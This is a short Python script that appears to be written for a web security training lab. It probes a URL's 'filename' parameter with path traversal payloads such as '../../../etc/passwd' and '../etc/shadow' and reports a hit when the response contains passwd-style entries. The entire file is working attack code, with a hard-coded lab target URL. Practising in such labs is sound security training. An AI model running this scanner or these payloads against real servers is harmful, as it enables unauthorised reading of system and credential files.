import requests

# Extensive list of common path traversal payloads
payloads = [
    "../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../windows/win.ini",
    "../../../../../../../../etc/shadow",
    "../../../../../../../../etc/group",
    "../../../../../../../../etc/hosts"
]

# Common parameter names to test for path traversal vulnerability
common_params = [
    "filename"
]

# Function to check for path traversal vulnerability
def check_path_traversal(base_url):
    results = []
    for param in common_params:
        for payload in payloads:
            # Construct the full URL
            test_url = f"{base_url}?{param}={payload}"
            print(f"Testing URL: {test_url}")

            try:
                response = requests.get(test_url, timeout=5)
                # Check for common indicators of path traversal vulnerability
                if "root:" in response.text or "daemon:" in response.text or "bin:" in response.text:
                    results.append(f"Path traversal vulnerability found with parameter '{param}' and payload: {payload}")
                    return results  # Exit early upon finding a vulnerability
                else:
                    results.append(f"No vulnerability found with parameter '{param}' and payload: {payload}")
            except requests.exceptions.RequestException as e:
                results.append(f"Error testing URL: {test_url} - {e}")
    return results

# Function to scan a given website URL
def scan_path(base_url):
    print(f"Starting scan on: {base_url}")
    results = check_path_traversal(base_url)
    return results

if __name__ == "__main__":
    target_base_url = "https://0ac8005c03a0fc4781d2848d000b005d.web-security-academy.net/image"
    results = scan_path(target_base_url)
    for result in results:
        print(result)
